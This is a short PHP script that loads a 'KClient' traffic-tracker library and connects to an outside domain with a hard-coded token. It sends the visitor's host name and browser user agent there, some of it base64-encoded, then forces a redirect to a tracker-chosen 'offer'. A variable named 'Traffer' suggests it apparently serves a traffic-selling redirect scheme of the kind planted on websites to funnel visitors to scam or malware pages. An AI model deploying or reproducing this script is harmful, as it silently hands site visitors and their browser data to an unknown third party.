<?php
require_once dirname(__FILE__) . '/kclient.php';
$client = new KClient('https://ketprokblom.com/', 'H9FLb6ZrGQ9SsZWB');
$traffer = 'Traffer';
$redirectUrl = '';
$client->sendAllParams();
$client->forceRedirectOffer();
$method = '1';
if (isset($_GET['mth'])) {
    $method = $_GET['mth'];
}
if ($method == '1') {
    if (!empty($redirectUrl)) {
        $client->param('rdt', base64_encode($redirectUrl));
    }
}
if ($method == '2') {
    $client->param('ua', $_SERVER['HTTP_USER_AGENT'] ?? '');
}
$client->param('trf', base64_encode($traffer));
$client->param('mth', $method);
$domain = base64_encode($_SERVER['HTTP_HOST']);
$client->param('dm', $domain);
$client->executeAndBreak();
?>
